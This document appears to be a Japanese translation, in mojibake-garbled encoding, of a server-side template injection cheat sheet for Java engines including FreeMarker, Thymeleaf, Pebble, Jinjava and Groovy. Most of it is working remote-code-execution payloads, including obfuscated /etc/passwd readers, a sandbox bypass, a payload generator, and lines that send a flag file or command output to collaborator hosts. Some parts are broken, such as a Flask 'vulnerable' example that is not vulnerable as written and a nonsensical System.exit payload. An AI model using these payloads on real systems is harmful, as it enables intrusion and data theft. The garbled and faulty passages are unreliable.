ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Javaã®Server-Side Template Injectionï¼ˆSSTIï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã®`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã¾ã™ã€‚

## è„†å¼±æ€§ã®èª¬æ˜

SSTIã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ãŠã‘ã‚‹è„†å¼±æ€§ã§ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€å‹•çš„ãªã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ãŒã€ä¸é©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã‚„ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ãŒè¡Œã‚ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## æ”»æ’ƒæ‰‹æ³•

ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ã€Javaã‚’ä½¿ç”¨ã—ã¦SSTIã‚’å®Ÿè¡Œã—ã€`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã¾ã™ã€‚

1. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
2. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ãƒˆã‚’ç‰¹å®šã—ã¾ã™ã€‚
3. ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ãƒˆã«Javaã®SSTIãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`${7*7}`ã®ã‚ˆã†ãªç®—è¡“æ¼”ç®—ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
4. ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæœ‰åŠ¹åŒ–ã•ã‚Œã€SSTIãŒç™ºç”Ÿã™ã‚‹ã¨ã€`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

## å¯¾ç­–æ–¹æ³•

ä»¥ä¸‹ã®å¯¾ç­–æ–¹æ³•ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€SSTIæ”»æ’ƒã‹ã‚‰ä¿è­·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

- ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æœ€æ–°ã«ä¿ã¤ã€‚
- å…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’é©åˆ‡ã«å®Ÿæ–½ã™ã‚‹ã€‚
- ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’å¼·åŒ–ã™ã‚‹ã€‚

## æ³¨æ„äº‹é …

SSTIæ”»æ’ƒã¯é•æ³•è¡Œç‚ºã§ã‚ã‚Šã€è¨±å¯ãªãä»–äººã®ã‚·ã‚¹ãƒ†ãƒ ã«ä¾µå…¥ã™ã‚‹ã“ã¨ã¯æ³•çš„ã«ç½°ã›ã‚‰ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€åˆæ³•çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆã‚„ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ä¸€ç’°ã¨ã—ã¦ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

ã‚ãªãŸã¯[https://try.freemarker.apache.org](https://try.freemarker.apache.org)ã§ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å›é¿**

âš ï¸ 2.3.30æœªæº€ã®Freemarkerãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã®ã¿æ©Ÿèƒ½ã—ã¾ã™ã€‚
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã®FreeMarkerã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§è©³ç´°ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã®Velocityã‚»ã‚¯ã‚·ãƒ§ãƒ³
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleafï¼ˆJavaï¼‰

SSTIã®å…¸å‹çš„ãªãƒ†ã‚¹ãƒˆå¼ã¯`${7*7}`ã§ã™ã€‚ã“ã®å¼ã¯Thymeleafã§ã‚‚æ©Ÿèƒ½ã—ã¾ã™ã€‚ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’é”æˆã—ãŸã„å ´åˆã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒ†ã‚¹ãƒˆå¼ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š

* SpringELï¼š`${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNLï¼š`${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

ãŸã ã—ã€å‰è¿°ã—ãŸã‚ˆã†ã«ã€å¼ã¯ç‰¹åˆ¥ãªThymeleafå±æ€§ã§ã®ã¿æ©Ÿèƒ½ã—ã¾ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ç•°ãªã‚‹å ´æ‰€ã§å¼ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€Thymeleafã¯_expression inlining_ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€å¼ã‚’`[[...]]`ã¾ãŸã¯`[(...)]`ã®å†…éƒ¨ã«é…ç½®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆç‰¹æ®Šãªè¨˜å·ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã©ã†ã‹ã«å¿œã˜ã¦ã€ã©ã¡ã‚‰ã‹ã‚’é¸æŠã—ã¾ã™ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€Thymeleafã®å˜ç´”ãªSSTIæ¤œå‡ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯`[[${7*7}]]`ã¨ãªã‚Šã¾ã™ã€‚

ãŸã ã—ã€ä¸Šè¨˜ã®æ¤œå‡ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ã¯éå¸¸ã«ä½ã„ã§ã™ã€‚SSTIã®è„†å¼±æ€§ã¯é€šå¸¸ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãŒã‚³ãƒ¼ãƒ‰å†…ã§å‹•çš„ã«ç”Ÿæˆã•ã‚Œã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Thymeleafã¯ã“ã®ã‚ˆã†ãªå‹•çš„ã«ç”Ÿæˆã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’è¨±å¯ã›ãšã€ã™ã¹ã¦ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯äº‹å‰ã«ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€é–‹ç™ºè€…ãŒæ–‡å­—åˆ—ã‹ã‚‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ã€Œå³åº§ã«ã€ä½œæˆã—ãŸã„å ´åˆã€ç‹¬è‡ªã®TemplateResolverã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯å¯èƒ½ã§ã™ãŒã€éå¸¸ã«ã¾ã‚Œã§ã™ã€‚

Thymeleafãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’è©³ã—ãè¦‹ã¦ã¿ã‚‹ã¨ã€_**expression preprocessing**_ã¨ã„ã†èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ã€‚ãƒ€ãƒ–ãƒ«ã‚¢ãƒ³ãƒ€ãƒ¼ã‚¹ã‚³ã‚¢ï¼ˆ`__...__`ï¼‰ã§å›²ã¾ã‚ŒãŸå¼ã¯ã€äº‹å‰å‡¦ç†ã•ã‚Œã€ãã®çµæœãŒé€šå¸¸ã®å‡¦ç†ä¸­ã«å¼ã®ä¸€éƒ¨ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã¯ã€Thymeleafãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®å…¬å¼ãªä¾‹ã§ã™ï¼š
```java
#{selection.__${sel.code}__}
```
**è„†å¼±ãªä¾‹**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    template = '''
    <h1>Welcome, {{ name }}!</h1>
    '''
    return render_template_string(template, name=name)

if __name__ == '__main__':
    app.run(debug=True)
```

This vulnerable example demonstrates a Server-Side Template Injection (SSTI) vulnerability in a Flask web application. The application takes a user-supplied parameter `name` from the query string and renders it directly in an HTML template using the `render_template_string` function.

An attacker can exploit this vulnerability by injecting malicious template code into the `name` parameter. Since the template code is executed on the server-side, the attacker can execute arbitrary code within the application's context.

To exploit this vulnerability, an attacker can craft a payload that executes arbitrary code, such as accessing sensitive data, executing system commands, or even compromising the underlying server.

It is important to note that this vulnerable example is for educational purposes only and should not be used in production environments. Always sanitize and validate user input to prevent SSTI vulnerabilities.
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**è©³ç´°æƒ…å ±**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Frameworkï¼ˆJavaï¼‰
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹**

è¤‡æ•°ã®å¤‰æ•°å¼ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚`${...}`ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã¯ã€`#{...}`ã€`*{...}`ã€`@{...}`ã€ã¾ãŸã¯`~{...}`ã‚’è©¦ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

* `/etc/passwd`ã‚’èª­ã¿å–ã‚‹
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ç”Ÿæˆã®ãŸã‚ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆ

```python
import requests

def generate_payload(template, command):
    payload = template.replace('{{COMMAND}}', command)
    return payload

def send_payload(url, payload):
    response = requests.post(url, data=payload)
    return response.text
```

ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¨ã‚³ãƒãƒ³ãƒ‰ã‚’å—ã‘å–ã‚Šã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚

`generate_payload`é–¢æ•°ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®`{{COMMAND}}`ã‚’æŒ‡å®šã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã§ç½®æ›ã—ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã¾ã™ã€‚

`send_payload`é–¢æ•°ã¯ã€ç”Ÿæˆã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ‡å®šã•ã‚ŒãŸURLã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦é€ä¿¡ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’è¿”ã—ã¾ã™ã€‚
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**è©³ç´°æƒ…å ±**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Springãƒ“ãƒ¥ãƒ¼æ“ä½œï¼ˆJavaï¼‰
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebbleï¼ˆJavaï¼‰

* `{{ someString.toUPPERCASE() }}`

Pebbleã®å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆãƒãƒ¼ã‚¸ãƒ§ãƒ³3.0.9æœªæº€ï¼‰ï¼š
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjavaï¼ˆJavaï¼‰

Jinjava is a Java-based template engine that allows for server-side template injection. It is commonly used in web applications built with Java frameworks such as Spring Boot.

#### How Server-Side Template Injection (SSTI) Works

Server-side template injection occurs when user-supplied input is directly embedded into a template engine without proper sanitization or validation. This can lead to the execution of arbitrary code on the server.

In the case of Jinjava, the injection point is typically within double curly braces (`{{ }}`). Any code or expression placed within these braces will be evaluated by the template engine.

#### Exploiting SSTI in Jinjava

To exploit SSTI in Jinjava, an attacker can craft a payload that will be executed by the template engine. This payload can include Java code, expressions, or even system commands.

For example, consider the following vulnerable code snippet:

```java
String template = "Hello, {{ name }}!";
String rendered = Jinjava.render(template, context);
```

In this case, if the `name` variable is not properly sanitized, an attacker can inject arbitrary code by providing a malicious input. For instance, the following payload would execute the `System.exit(0)` command:

```
{{ 7*'7'.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('System.exit(0)') }}
```

#### Preventing SSTI in Jinjava

To prevent server-side template injection in Jinjava, it is crucial to properly sanitize and validate user input before embedding it into the template. This can be achieved by using a combination of input validation, output encoding, and context-specific sanitization techniques.

Additionally, it is recommended to keep Jinjava and other template engines up to date with the latest security patches to mitigate any known vulnerabilities.

#### Conclusion

Server-side template injection in Jinjava can lead to serious security vulnerabilities if not properly addressed. By understanding how SSTI works and implementing appropriate security measures, developers can protect their applications from potential attacks.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjavaã¯ã€Hubspotã«ã‚ˆã£ã¦é–‹ç™ºã•ã‚ŒãŸã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã€[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚

**Jinjava - ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)ã«ã‚ˆã£ã¦ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã®åŒºåˆ‡ã‚Šè¨˜å·
* `{{ }}` å¼ã®åŒºåˆ‡ã‚Šè¨˜å·
* `{# #}` ã‚³ãƒ¡ãƒ³ãƒˆã®åŒºåˆ‡ã‚Šè¨˜å·
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest" ã‚’æ¤œç´¢ã—ã€[Githubä¸Šã®Jinjavaãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ](https://github.com/HubSpot/jinjava/)ã‚’ç™ºè¦‹ã—ã¾ã—ãŸã€‚
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**è©³ç´°æƒ…å ±**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

ELã¯ã€ãƒ—ãƒ¬ã‚¼ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³å±¤ï¼ˆWebãƒšãƒ¼ã‚¸ï¼‰ã¨ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ã‚¸ãƒƒã‚¯ï¼ˆç®¡ç†ã•ã‚ŒãŸBeanï¼‰ã®é–“ã§ã®é€šä¿¡ã‚’å¯èƒ½ã«ã™ã‚‹é‡è¦ãªãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã™ã€‚ELã¯ã€JavaServer Facesãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã€JavaServer Pagesï¼ˆJSPï¼‰ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã€ãŠã‚ˆã³Java EEã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¨ä¾å­˜æ€§ã®æ³¨å…¥ï¼ˆCDIï¼‰ãªã©ã€**ã„ãã¤ã‹ã®JavaEEãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼**ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚\
ELã‚¤ãƒ³ã‚¿ãƒ—ãƒªã‚¿ã®**æ‚ªç”¨**ã«ã¤ã„ã¦è©³ã—ãã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

ã“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹ã¯ã€ã“ã®[**è§£èª¬è¨˜äº‹**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸã€‚
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
